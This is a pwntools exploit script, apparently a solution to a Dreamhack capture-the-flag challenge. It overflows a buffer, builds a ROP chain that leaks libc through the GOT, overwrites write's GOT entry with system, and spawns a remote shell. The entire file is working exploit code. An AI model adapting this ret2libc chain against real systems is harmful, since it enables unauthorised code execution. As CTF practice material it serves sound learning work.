from pwn import *

#p = process("./basic_rop_x64")
p = remote("host3.dreamhack.games",17990)
e = ELF("./basic_rop_x64")
r = ROP(e)
libc = ELF("./libc.so.6")
bss_addr = e.bss()

buf = b"A"*0x40

pop_rsi_r15 = r.find_gadget(['pop rsi', 'pop r15'])[0]
pop_rdi = r.find_gadget(['pop rdi'])[0]
ret = r.find_gadget(['ret'])[0]

read_plt = e.plt["read"]
write_plt = e.plt["write"]
read_got = e.got["read"]
write_got = e.got["write"]

payload = buf + b'B'*8 

payload += p64(pop_rdi) + p64(1) 
payload += p64(pop_rsi_r15) + p64(write_got) + p64(0) 
payload += p64(write_plt)

payload += p64(pop_rdi) + p64(0) 
payload += p64(pop_rsi_r15) + p64(bss_addr) + p64(0)
payload += p64(read_plt)

payload += p64(pop_rdi) + p64(0) 
payload += p64(pop_rsi_r15) + p64(write_got) + p64(0)
payload += p64(read_plt)

payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bss_addr)
payload += p64(write_plt)

p.send(payload)
p.recvuntil(b'A'*64)
read_addr = u64(p.recvn(6)+b"\x00"*2) 
lb = read_addr - libc.symbols["write"]
system = lb + libc.symbols["system"] 

p.send(b"/bin/sh\x00")
p.send(p64(system))

p.interactive()